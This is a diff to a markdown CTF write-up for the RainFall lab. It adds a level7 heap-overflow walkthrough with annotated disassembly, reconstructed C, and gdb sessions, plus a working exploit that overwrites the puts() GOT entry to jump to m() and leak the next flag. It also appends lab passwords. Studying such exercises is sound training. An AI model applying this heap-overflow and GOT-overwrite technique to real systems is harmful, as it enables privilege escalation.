@@ -1293,7 +1293,6 @@ End of assembler dump.
 ### Equivalent C source code
 
 
-
 ```c
 #include <stdio.h>
 
@@ -1315,13 +1314,17 @@ int     main(int ac, char **av) {
         (void *)(*(buf + 28)) = malloc(64);
         (void *)(*(buf + 24)) = malloc(4);
         (void *)(*(buf + 24)) = &m;
-        strcpy(&buf[28], *(buf - 12) + 4);
+        strcpy((void *)(*(buf + 28)), av[1]);
         *(&buf[24])();
         return ;
 }
 ```
 
 ### Walktrough
+
+#### Malloc exploitation
+
+- [Heap execution exploitation](https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.1)
 
 ```bash
 level6@RainFall:~$ ./level6
@@ -1347,7 +1350,25 @@ Program received signal SIGSEGV, Segmentation fault.
 0x08048408 in __do_global_dtors_aux ()
 ```
 
-- It also segfaults when the 1st argument is longer than 71 bytes, it looks like the [73 to 76] bytes can be used to overwrite EIP
+- As we can see the program segfault when we start to pass more than 71 bytes
+
+In fact, what we're doing here is simple:
+
+Malloc uses a structure to store our allocations informations, for an allocated chunk, we use 4 bytes, 3 for the size aligned to 8, and the last one for the status which tells if a chunk is free or not.
+
+Even if we only use 4 bytes, the whole structure will take 8 bytes to be sure to align correctly with memory pages.
+
+![](https://www.win.tue.nl/~aeb/linux/hh/malloc.png)
+
+So in our case we write a total of 76 bytes:
+
+- 64 for our first malloc() call
+
+- 4 to overwrite the chunk informations
+
+- 4 other to overwrite the rest of the malloc structure
+
+- 4 to fill the 2nd malloc() call, which is executed
 
 ```bash
 (gdb) run $(python -c 'print "A"*76')
@@ -1381,9 +1402,444 @@ f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 ### ASM Interpretation
 
+```asm
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x08048521 <+0>:     push   ebp ; ASM Prologue
+   0x08048522 <+1>:     mov    ebp,esp ; ASM Prologue
+
+   0x08048524 <+3>:     and    esp,0xfffffff0 ; Align esp
+   0x08048527 <+6>:     sub    esp,0x20 ; Allocate 32 bytes on the stack
+
+   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8 ; Set 8 to the 1st argument of malloc()
+   0x08048531 <+16>:    call   0x80483f0 <malloc@plt> ; Call malloc(8);
+   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax ; Set 28th byte of the stack to eax (return of malloc)
+   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
+   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1 ; Set the value pointed by eax to 1
+
+   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8 ; Set 1st argument of malloc() to 8
+   0x0804854b <+42>:    call   0x80483f0 <malloc@plt> ; Call malloc(8);
+   0x08048550 <+47>:    mov    edx,eax ; Set edx to eax (return of malloc)
+   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to 28th byte of the stack
+   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx ; Set the 4th to 8th byte of the allocation stored in the 28th to edx
+
+   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8 ; Set the 1st argument of malloc to 8
+   0x08048560 <+63>:    call   0x80483f0 <malloc@plt> ; Call malloc(8)
+   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax ; Set the 24th byte of the stack to the return of malloc()
+   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
+   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2 ; Set the value of the first 4 bytes stored in eax to 2
+
+   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8 ; Set 8 as the first argument of malloc
+   0x0804857a <+89>:    call   0x80483f0 <malloc@plt> ; Call malloc(8)
+   0x0804857f <+94>:    mov    edx,eax ; Set the return of malloc to edx
+   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
+   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx ; Set the 4th to 7th byte of the address stored in eax to the return of malloc store in edx
+
+   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc] ; Set eax to the 2nd argument of main() / av
+   0x0804858b <+106>:   add    eax,0x4 ; add 4 to the address pointed by eax (av[1])
+   0x0804858e <+109>:   mov    eax,DWORD PTR [eax] ; set eax to the value pointed by it
+   0x08048590 <+111>:   mov    edx,eax ; Set edx to eax
+   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
+   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4] ; Set eax to the value pointed by it + 4
+
+   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx ; Set the 2nd argument of strcpy to edx
+   0x0804859d <+124>:   mov    DWORD PTR [esp],eax ; Set the 1st argument of strcpy to eax
+   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt> ; Call strcpy(eax, edx)
+   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc] ; Set eax to av
+   0x080485a8 <+135>:   add    eax,0x8 ; Add 8 to eax (av[2])
+   0x080485ab <+138>:   mov    eax,DWORD PTR [eax] ; Set eax to the value stored in it
+   0x080485ad <+140>:   mov    edx,eax ; Move eax to edx
+   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18] ; Set eax to 24th byte of the stack
+   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4] ; Set eax to the value stored in eax + 4
+
+   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx ; Set edx as the 2nd argument of strcpy
+   0x080485ba <+153>:   mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strcpy
+   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt> ; Call strcpy(eax, edx);
+   0x080485c2 <+161>:   mov    edx,0x80486e9 ; printf "%s", 0x80486e9 -> "r"
+   0x080485c7 <+166>:   mov    eax, ; printf "%s", 0x80486eb -> "/home/user/level8/.pass"
+
+   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx ; Set edx to the 2nd argument of fopen()
+   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax ; Set eax to the 1st argument of fopen()
+   0x080485d3 <+178>:   call   0x8048430 <fopen@plt> ; Call fopen("/home/user/level8/.pass", "r");
+     ; FILE *fopen(const char * restrict path, const char * restrict mode);
+
+   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax ; Set eax as 3rd argument of fgets()
+   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44 ; Set 68 as 2nd argument of fgets()
+   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960 ; printf "%s", 0x8049960 -> "" ; x/c 0x8049960 -> "0x8049960 <c>:  0x0"
+   0x080485eb <+202>:   call   0x80483c0 <fgets@plt> ; Call fgets("", 68, eax);
+     ; char *fgets(char * restrict str, int size, FILE * restrict stream);
+
+   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703 ; printf "%s", 0x8048703 -> "~~"
+   0x080485f7 <+214>:   call   0x8048400 <puts@plt> ; Call puts("~~")
+     ; int puts(const char *s);
+   0x080485fc <+219>:   mov    eax,0x0 ; Set 0 as return value of main()
+
+   0x08048601 <+224>:   leave ; ASM Epilogue
+   0x08048602 <+225>:   ret ; ASM Epilogue
+End of assembler dump.
+
+gdb-peda$ disas m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:     push   ebp ; ASM Prologue
+   0x080484f5 <+1>:     mov    ebp,esp ; ASM Prologue
+
+   0x080484f7 <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
+   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0 ; Set 0 as the first argument of time()
+   0x08048501 <+13>:    call   0x80483d0 <time@plt> ; Call time(0)
+     ; time_t time(time_t *tloc);
+   0x08048506 <+18>:    mov    edx,0x80486e0 ; printf "%s", 0x80486e0 -> "%s - %d" ; Set edx to "%s - %d"
+   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax ; Set 3rd argument of printf() to eax
+   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960 ; printf "%d", *0x8049960 -> "0" ; Set 2nd argument of printf to 0
+   0x08048517 <+35>:    mov    DWORD PTR [esp],edx ; Set edx to 1st argument of printf
+   0x0804851a <+38>:    call   0x80483b0 <printf@plt> ; Call printf("%s - %d", 0, eax);
+     ; int printf(const char * restrict format, ...);
+
+   0x0804851f <+43>:    leave ; ASM Epilogue
+   0x08048520 <+44>:    ret ; ASM Epilogue
+End of assembler dump.
+```
+
 ### Equivalent C source code
 
+```c
+void    m(void) {
+        unsigned char   align[24];
+
+        printf("%s - %d", 0x8049960, time(NULL));
+        return ;
+}
+
+int             main() {
+        void            *s1;
+        void            *s2;
+        unsigned char   align[24];
+
+        s1 = malloc(8);
+        s1[0] = 1;
+        
+        s1[1] = malloc(8);
+        
+        s2 = malloc(8);
+        s2[0] = 2;
+        
+        s2[1] = malloc(8);
+        
+        strcpy(s1[1], av[1]);
+        
+        strcpy(s2[1], av[2]);
+
+        fgets(0x8049960, 68, fopen("/home/user/level8/.pass", "r"));
+
+        puts("~~");
+
+        return (0);
+}
+```
+
 ### Walktrough
+
+```bash
+level7@RainFall:~$ ./level7
+Segmentation fault (core dumped)
+
+level7@RainFall:~$ ./level7 a
+Segmentation fault (core dumped)
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*72')
+Segmentation fault (core dumped)
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*500')
+Segmentation fault (core dumped)
+
+level7@RainFall:~$ ./level7  a a
+~~
+
+level7@RainFall:~$ ./level7  a a a
+~~
+
+level7@RainFall:~$ ./level7  a b
+~~
+
+level7@RainFall:~$ ./level7  $(python -c 'print "A"*20') $(python -c 'print "A"*20')
+~~
+
+level7@RainFall:~$ ./level7  $(python -c 'print "A"*21') $(python -c 'print "A"*20')
+Segmentation fault (core dumped)
+```
+
+- As address randomization is disabled on the vm, I tried to identify the returns of the malloc calls, which will always be the same as long as they succeed and we try to malloc a size of the same range (tiny / small) and the allocation is not in it's own page
+
+```bash
+level7@RainFall:~$ gdb -x /tmp/gdb ./level7
+(gdb) r $(python -c 'print "A"*50') $(python -c 'print "B"*50')
+Starting program: /home/user/level7/level7 $(python -c 'print "A"*50') $(python -c 'print "B"*50')
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+(gdb) b *main+21
+(gdb) b *main+47
+(gdb) b *main+68
+(gdb) b *main+94
+
+(gdb) r $(python -c 'print "A"*50') $(python -c 'print "B"*50')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 $(python -c 'print "A"*50') $(python -c 'print "B"*50')
+
+Breakpoint 1, 0x08048536 in main ()
+(gdb) printf "%x", $eax
+804a008
+
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x08048550 in main ()
+
+(gdb) printf "%x", $eax
+804a018
+
+(gdb) continue
+Continuing.
+
+Breakpoint 3, 0x08048550 in main ()
+
+(gdb) printf "%x", $eax
+804a028
+
+(gdb) continue
+Continuing.
+
+Breakpoint 4, 0x08048550 in main ()
+
+(gdb) printf "%x", $eax
+804a038
+```
+
+- As we can see all the allocations are separated by 16 bytes, which makes 8 given to our program and 8 others for the aligned malloc structure
+
+Our main() function can be annotated like:
+
+```c
+void    m(void) {
+        unsigned char   align[24];
+
+        printf("%s - %d", 0x8049960, time(NULL));
+        return ;
+}
+
+int             main() {
+        void            *s1;
+        void            *s2;
+        unsigned char   align[24];
+
+        s1 = malloc(8); // if succeeds, returns 0x804a008
+        s1[0] = 1;
+        
+        s1[1] = malloc(8); // 0x804a018
+        
+        s2 = malloc(8); // 0x804a028
+        s2[0] = 2;
+        
+        s2[1] = malloc(8); // 0x804a038
+        
+        strcpy(s1[1], av[1]);
+        
+        strcpy(s2[1], av[2]);
+
+        fgets(0x8049960, 68, fopen("/home/user/level8/.pass", "r"));
+
+        puts("~~");
+
+        return (0);
+}
+```
+
+- Now back on gdb, let's inspect what the first strcpy is doing
+
+```bash
+(gdb) b *main+132
+
+(gdb) r $(python -c 'print "A"*50') $(python -c 'print "B"*50')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 $(python -c 'print "A"*50') $(python -c 'print "B"*50')
+
+Breakpoint 1, 0x080485a5 in main ()
+
+(gdb) x/100x 0x804a008
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a048:      0x00004141      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+The 1st line is the first allocation,
+
+`0x804a008:      [0x00000001]      0x0804a018      0x00000000      0x00000011`
+
+we can see the first byte is equals to `1`,
+
+`0x804a008:      0x00000001      [0x0804a018]      0x00000000      0x00000011`
+
+the next one to the address of the 2nd allocation where the strcpy writes,
+
+`0x804a008:      0x00000001      0x0804a018      [[0x00000000]      [0x0000001][1]]`
+
+and the 2 last bytes are the structure used by malloc for the next allocation, the 1st is for the alignement of the structure, and the 2th contains a `status` bit (lowest weight) set to 1 to indicate the allocation isn't free, and the rest are the size of the structure (16).
+
+- Most importantly, we can see the `strcpy` writes over structures used by malloc
+
+- And the 2nd strcpy makes the program segfault by trying to write on *0x41414141
+
+```bash
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
+```
+
+- The address the second strcpy writes to is defined at 0x41414141, so we can write to any address the content of av[2] if we pass in av[1] (0x804a038 – 0x804a018 = 0x20 / 32) bytes and the address 
+
+Let's do a quick test:
+
+```bash
+(gdb) b *main+132
+
+(gdb) r $(python -c 'print "A"*8') $(python -c 'print "B"*4')
+Breakpoint 1, 0x080485a5 in main ()
+
+(gdb) x/100x 0x804a008
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x41414141      0x00000000      0x00000011
+0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
+0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+...
+
+(gdb) b *main+161
+
+(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x38\xa0\x04\x08') $(python -c 'print "B"*4')
+Breakpoint 1, 0x080485a5 in main ()
+
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080485c2 in main ()
+
+(gdb) x/100x 0x804a008
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a028:      0x02010101      0x0804a038      0x00000000      0x00000011
+0x804a038:      0x42424242      0x00000000      0x00000000      0x00020fc1
+...
+
+(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x48\xa0\x04\x08') $(python -c 'print "B"*4')
+
+Breakpoint 1, 0x080485a5 in main ()
+
+(gdb) set {char}0x080486fb='7' # fgets() will crash when opening the level8 password file as we cannot setuid to level8
+
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080485c2 in main ()
+
+(gdb) x/100x 0x804a008
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a028:      0x02010101      0x0804a048      0x00000000      0x00000011
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
+0x804a048:      0x42424242      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+...
+
+(gdb) continue
+Continuing.
+~~
+[Inferior 1 (process 2891) exited normally]
+
+```
+
+- We wrote 16 bytes after the malloc call ! The program doesn't segfault as we're still in the same memory page, usually of size 4096
+
+Note that I changed the value of `2` assigned with some '\x01', doing '\x00' instead would cause the strcpy() to stop
+
+- Now let's try to overwrite the puts() call:
+
+```bash
+level7@RainFall:~$ objdump -R ./level7
+
+./level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+...
+08049928 R_386_JUMP_SLOT   puts
+...
+
+# Back in gdb
+(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e 'BBBB')
+Starting program: /home/user/level7/level7 $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e 'BBBB')
+
+Breakpoint 1, 0x080485a5 in main ()
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080485c2 in main ()
+(gdb) set {char}0x080486fb='7'
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+- Our EIP has changed to the address we wrote at the location of puts() ! Let's try again with the address of the m() function
+
+```bash
+(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e '\xf4\x84\x04\x08')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e '\xf4\x84\x04\x08')
+
+Breakpoint 1, 0x080485a5 in main ()
+
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080485c2 in main ()
+
+(gdb) set {char}0x080486fb='7'
+
+(gdb) continue
+Continuing.
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+ - 1584111922
+[Inferior 1 (process 2912) exited normally]
+```
+
+- Do the same without gdb calling ptrace() so we can setuid()
+
+```bash
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e '\xf4\x84\x04\x08')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1584111992
+
+level7@RainFall:~$ su level8
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
+
+level8@RainFall:~$
+```
 
 ## Misc / References
 
@@ -1451,6 +1907,10 @@ bonus3:x:2013:2013::/home/user/bonus3:/bin/bash
 end:x:2014:2014::/home/user/end:/bin/bash
 ```
 
+### Todo list
+
+- [ ]
+
 ### Passwords
 
 ```bash
@@ -1462,4 +1922,5 @@ level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 level6 -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 level7 -> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+level8 -> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 ```
